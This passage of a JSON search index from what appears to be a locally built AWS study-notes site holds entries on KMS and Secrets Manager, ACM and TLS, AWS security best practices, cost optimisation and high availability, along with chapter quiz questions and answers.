	"content": "Best practices KMS\nSecurity, Identity, \u0026amp; Compliance \u0026gt; Key Management Service (KMS)\nCustomer managed keys - Create key Configure key Key type: Key usage: Advanced options: KMS Regionality: Single-Region key NEXT Add lables Alias: key-1 NEXT Define key administrative permissions NEXT Define key usage permissions NEXT KMS \u0026gt; Customer managed keys : key-1\nSchedule key deletion \u0026gt; Waiting period (in days): 30 \u0026gt; SCHEDULE DELETION - - Use this key to encrypt an EBS volume EBS \u0026gt; Volumes \u0026gt; Create volume Secrets Manager\nAWS Secrets Manager \u0026gt; Store a new secret Secret type: Other type of secret Key/value pairs: test-key / test-value Encryption key: aws/secretsmanager NEXT Configure secret Secret name: test-secret (can you Lambda function to rotate secrets key) NEXT STORE Store Sensitive Information in AWS AWS KMS allows you to create and store keys used for cryptographic operations AWS Secrets Manager protects secrets related to your applications and services AWS KMS\nCreate and edit symmetric and asymmetric keys Control access to keys using key policies and IAM policies Automatically rotate the cryptographic material of a key For asymmetric key pairs, the public key can be exported outside of AWS Keys are AWS-managed or customer-managed You can also create multi-region keys Secrets Manager\nSecrets Manager can manage: Database and application credentials API keys OAuth tokens SSH keys Other secrets Encrypts secrets using KMS keys When retrieved, the secret is decrypted and transmitted over TLS Control access using IAM policies Use IAM cross-account access to allow users in other accounts to access secrets in your account Can automatically rotate your secrets based on a schedule using a Lambda function Hard-coding credentials in the application source code is a security risk\nStore credentials in Secrets Manager and configure the application to call service\n"
},
{
	"uri": "http://localhost:1313/aws-ws/9-awssecu/",
	"title": "AWS Process",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "http://localhost:1313/aws-ws/5-cloudquest/5.9-efs/",
	"title": "File Systems in the Cloud",
	"tags": [],
	"description": "",
	"content": "Business Request Help the city\u0026rsquo;s pet modeling agency share file data without provisioning or managing storage.\nLearning Objectives Summarize the different storage options available on AWS. Summarize the key features and benefits of Amazon EFS. Identify business use cases for Amazon EFS. Configure Amazon EFS endpoints to access centralized storage. "
},
{
	"uri": "http://localhost:1313/aws-ws/10-awssecuview/10.9-data/",
	"title": "Securing data in transit",
	"tags": [],
	"description": "",
	"content": "Best practices AWS Certificates Manager (ACM) \u0026gt; Request certificate Domain name: example.com Validation method: DNS validation Key algorithm: RSA 2048 REQUEST Input certificate detail Securing data in transit Data in transit is secured using SSL/TLS certificates AWS Certificat Manager (ACM) allows you to provision and manage SSL/TLS certificates SSL/TLS\nSecure Sockets Layer (SSL) and Transport Layer Security (TLS) are cryptographic protocols that secure communications TLS is the successor of SSL Both protocols use certificates When you visit a website, your browser requests the server\u0026rsquo;s certificate Your browser verifies that the server certificate is issued by a trusted certificates authority (CA) CAs are widely recognized and trusted to issue SSL/TLS certificates Your browser is preinstalled with a list of trusted CAs After verifying the server\u0026rsquo;s identity, your browser establishes a secure channel using the public key in the certificate AWS Certificate Manager (ACM)\nAllows you to request a publicly trusted certificate Manages private SSL/TLS certificates Allows you to import certificates issued by third-party CAs Supported by Elastic Load Balancing, CloudFront, Elastic Beanstalk, API gateway, etc.. ACM Certificates\nACM certificates can secure: Single domain names like www.example.com Multiple domain names like www.example.com and www.example.net Trusted by major browsers: Chrome, firefox "
},
{
	"uri": "http://localhost:1313/aws-ws/10-awssecuview/",
	"title": "AWS &amp; Security Overview",
	"tags": [],
	"description": "",
	"content": "Security best practices - - - Avoid using the root account for everyday activities Enable multifactor authentication for all users Implement least privilege access Regularly review user permissions Use a centralized identity provider to manage user identities Use account-level separation Use AWS Organization to manage multiple accounts and enforce policy-based management Use AWS Control Tower to setup accounts bases on best practices Congigure a strong password policy Use IAM Roles instead of access keys Audit credentials to identify unused users, roles, permissions, policies, or credentials Identify resources shared with external entities Identify unused access, such as roles, access keys, or passwords Validate IAM policies against AWS best practices IAM Access Analyzer A credential report lists all users and the status of their credentials Security Best Practices: Store secrests securely Create network-level isolation Classify data Protect data at rest and in motion Configure logging Perform vulnerability management Keep up-to-date with security recommendations AWS Services: Identity and Access Management (IAM) Organizing multiple accounts with AWS Organizations Governing multiple accounts using AWS Control Tower IAM Identity Center VPC and Subnets VPN and Direct Connect Controlling inbound traffic with security groups and network ACLS Securing keys and Credentials (AWS Key Management Service - KMS) Security data in transit (AWS Certificate Manager - ACM ) Question How does IAM Identity Center help in simplifying access management for users across multiple AWS accounts and SAML-enabled cloud applications? It centralizes access management through a single sign-on experience, reducing the need for multiple sets of credentials. Which connectivity option in AWS allows customers to establish a dedicated private connection from their on-premises network to their VPC? AWS Direct Connect How does AWS Direct Connect differ from AWS Site-to-Site VPN in terms of connectivity? AWS Direct Connect provides a dedicated connection bypassing the public internet, while AWS Site-to-Site VPN establishes a secure connection over the public internet. How do network ACLs differ from security groups? Network ACLs operate at the subnet level and support both allow and deny rules, while security groups operate at the resource level and only support allow rules. Which of these is true about AWS Key Management Service (KMS)? AWS KMS provides AWS-managed keys, created automatically by the service, and customer-managed keys, created by the user. AWS KMS supports both symmetric and asymmetric keys for cryptographic operations. Which of these is true about AWS Secrets Manager? Secrets stored in AWS Secrets Manager are encrypted at rest using AWS KMS keys. Secrets Manager allows you to manage and retrieve database and application credentials, API keys, OAuth tokens, SSH keys and other secrets. What type of domain names can ACM certificates secure? single, multiple, and wildcard domain names Why should the root AWS account not be used for everyday activities? It increases the risk of unauthorized access and misuse. How does the best practice recommendation of the principle of least privilege help when granting access permissions in AWS? It grants only the minimum permissions required for a task or job role to enhance security. How do IAM policies affect access when multiple policies are associated with a single AWS user? The user\u0026rsquo;s effective permissions are the sum total (cumulative effect) of all the attached policies. Why might an organization choose to use AWS Organizations for managing multiple AWS accounts? to enable centralized billing, management of permissions, and policy enforcement across all accounts How do AWS Control Tower\u0026rsquo;s log archive account and audit account enhance security and compliance? They centralize the storage of logs and facilitate the auditing process. Design a Strategy for Secure Access Implement strong identity and access management Manage identities within AWS or use an external identity provider Consider granting secure access to external users Implement principle of least privilege Use identity-base policies to define permissions for users and groups Use resource-based policies to control access to resources Use services control policies (SCPs) to define maximum permissions for member accounts in an AWS organization - Secure every layer Protect data Considerations for Identifying and Classifying data Is it personally identifiable information (PII) ? Is it intellectual property ? Is it protected health information (PHI)? Is it financial information? Where is the data stored? Who owns the data ? Who can access and modify the data? What is the bussiness impact ? Protect data Use encryption to protect data at rest Use secure protocols to protect data in transit Implement Traceability Use AWS CloudTrail to maintain an audit trail Use AWS Config to record configurations Use AWX X-Ray to get an end-to-end view of request Use VPC Flow Logs to capture IP traffic Tag resources to assign ownership Store logs in an S3 bucket or CloudWatch log group for analysis Prepair for Security Events Create an incident response plan Documentation on AWS incident respose AWS Organizations or AWS Control Tower? Use AWS Organizations if you need a simple solution to consolidate multiple accounts into a single organization Use AWS Control Tower if you want to set up accounts according to sercuriy and compliance best practices "
},
{
	"uri": "http://localhost:1313/aws-ws/5-cloudquest/5.10-nosql/",
	"title": "First NoSQL Database",
	"tags": [],
	"description": "",
	"content": "Business Request Help the island\u0026rsquo;s streaming entertainment service implement a NoSQL database to develop new features.\nLearning Objectives Summarize the different uses of common purpose-built databases. Describe the features and benefits of Amazon DynamoDB. Interact with the elements and attributes of an Amazon DynamoDB database. Set Up a NoSQL database with Amazon DynamoDB. "
},
{
	"uri": "http://localhost:1313/aws-ws/5-cloudquest/5.11-healscal/",
	"title": "Auto-healing and Scaling Applications",
	"tags": [],
	"description": "",
	"content": "Business Request Assist the city\u0026rsquo;s gaming cafe with implementing auto healing servers while restricting patrons to a specific provisioning capacity.\nLearning Objectives Describe the auto healing and scaling capabilities offered by Auto Scaling groups. Create an Auto Scaling group with strict resource boundaries. Configure an Auto Scaling group to respond to a time-based event. "
},
{
	"uri": "http://localhost:1313/aws-ws/11-cost/",
	"title": "Optimize Cost",
	"tags": [],
	"description": "",
	"content": "Chapter Quiz How does a tagging policy contribute to cost optimization? It helps in tracking costs and identifying resources by owner, project, and other attributes. How can CloudWatch help in rightsizing EC2 instances? to monitor resource usage and identify opportunities for downsizing How can lifecycle policies in Amazon S3 help reduce storage costs? by transitioning data to cheaper storage classes and deleting expired data When should you use AWS Budgets? when you want to set a monthly cost budget with alerts Best Practices AWS Account \u0026gt; Billing and Cost Management\nPricing Calculator : Create Estimate Configure EC2 \u0026gt; SAVE AND ADD SERVICE Add Service Cost Explorer Report parameter Tag: Cost Center: Ex: Filter ID: 10011 | 10012 Save to report library Budget Cost Allocation Tags Cost and Usage Reports Data Exports Bills Strategies for optimizing costs Understand Pricing Models\nMost services have pay-as-you-go pricing Services have configuration options to optimize cotst For example: EC2 instances support On-Demand Instances, Saving Plans, and more Amazon S3 has storage classes with different pricing Rightsize your resources\nServices have configurations for different performance use cases Use the configuration that meets your requiements Undersizing can lead to performance issues, and oversizing can lead to unnecessary costs Audit refularly for underutilized and unsused resources Use Auto Scaling\nMany AWS services support auto scaling Utilize auto scaling to match supply with demand and optimize costs Manage Data Transfer Costs\nAvoid routing traffic over the internet when connecting AWS services Use VPC engpoints to keep traffic on the AWS network Use AWS Direct Connect to optimize data transfer costs between on-premises environment and AWS Implement Governance\nGovernance is critical for cost control Develop policies for resource provisioning Implement tagging policy to cateforize resources Use IAM to restrict user and application access Measure Spending\nUse tools to understand spending and receive recommendations For example, AWS Cost Explorer and Cost allocation tags Regularly audit to ensure compliance with governance policies and reduce unnecessary spending Reduce Compute Costs AWS Compute Services\nAmazon EC2 AWS Lambda Amazon Elastic Container Service (ECS) AWS Elastic Beanstalk Rightsize EC2 Instances\nEC2 instance families: Gerneral purpose Compute optimized Memory optimized Storage optimized Each instance family has many instance types/sizes Each instane type and family is optimized for specific use cases T3 is suitable for web servers and small databases C5 is suitable for batch processing, scientific modeling, and high-performance computing Use CloudWatch to monitor instance usage Downsize underutilized instances to reduce costs Utilize Spot Instances\nSpot Instance offer spare EC2 capacity at low rates - in some cases, up to 90% lower than On-Demand rates AWS may interrupt them with a two-minute warning Applications that can handle interuptions can use Spot Instances Use On-demand and Sport Instances to handle a workload If the Spot Instances are interrupted, On-Demand Instances can continue to operate Leverage Reserved Instances and Savings Plans\nReserved Instance and Savings Plans offer significant discounts Require one- or three-year commitment Ideal for long-term projects with predictable usage Implement Audo Scaling\nAuto scaling adds or removes instances to handle the workload Prevents under- or over-provisioning Adopt Serverless\nWith serverless (like AWS Lambda), you only pay when your code runs, reducing costs Create event-driven architectures Consolidate Workloads\nCombine multiple workloads into fewer instances Identify underutilized instances and evalute workloads for compatibility Consolicate and monitor performance to ensure expected outcomes Reduce Storage Costs Tools to track cost and usage "
},
{
	"uri": "http://localhost:1313/aws-ws/12-automate/",
	"title": "Automate Infrastructure",
	"tags": [],
	"description": "",
	"content": "Consider Automation Other Automation Tools ![131][13] "
},
{
	"uri": "http://localhost:1313/aws-ws/5-cloudquest/5.12-ha/",
	"title": "Highly Available Web Applications",
	"tags": [],
	"description": "",
	"content": "Business Request Help the travel agency create a highly available web application architecture.\nLearning Objectives Describe the principles for architecting highly available applications. Summarize the benefits of using an AWS Application Load Balancer (ALB). Use Auto Scaling groups with load balancing and health monitoring. "
},
{
	"uri": "http://localhost:1313/aws-ws/13-ha/",
	"title": "Resilience and High Availiability",
	"tags": [],
	"description": "",
	"content": "Chapter Quiz How does a read replica contribute to the resilience of a database in Amazon RDS? by offloading read queries and serving as a backup in case of primary instance failure What feature in Amazon RDS and Amazon Aurora enables seamless transition between production and staging environments for databases? Blue/Green deployment In which scenario is a Gateway load balancer recommended? when using third-party virtual appliances for network traffic inspection Which AWS services are commonly used for decoupling and creating event-based architectures? imple Notification Service (SNS) and Simple Queue Service (SQS) How does Simple Queue Service (SQS) help in creating a decoupled application architecture? It acts as a message buffer between sender and receiver applications. Which AWS service allows developers to focus only on the application code while handling deployment details like capacity provisioning and load balancing? Elastic Beanstalk What is the benefit of using Amazon EC2 Instances as the launch type for ECS? It provides more control over the underlying infrastructure, allowing for customization. Which AWS storage service allows on-premises systems to store and retrieve objects in Amazon S3? Storage Gateway How is Recovery Time Objective (RTO) defined? the maximum acceptable delay between service interruption and restoration Why is it recommended to build loosely coupled architectures? to contain failures to only affected components and allow independent scaling How does distributing workloads across multiple Availability Zones contribute to system resilience? It minimizes the impact of failures in a single location. Design for Failure RTO and RPO "
},
{
	"uri": "http://localhost:1313/aws-ws/14-perform/",
	"title": "Improve Performance",
	"tags": [],
	"description": "",
	"content": "Best Practices "
},
{
	"uri": "http://localhost:1313/aws-ws/15-ai/",
	"title": "AI",
	"tags": [],
	"description": "",
	"content": "Best Practices "
},
{
	"uri": "http://localhost:1313/aws-ws/categories/",
	"title": "Categories",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "http://localhost:1313/aws-ws/tags/",
	"title": "Tags",
	"tags": [],
	"description": "",
	"content": ""
}]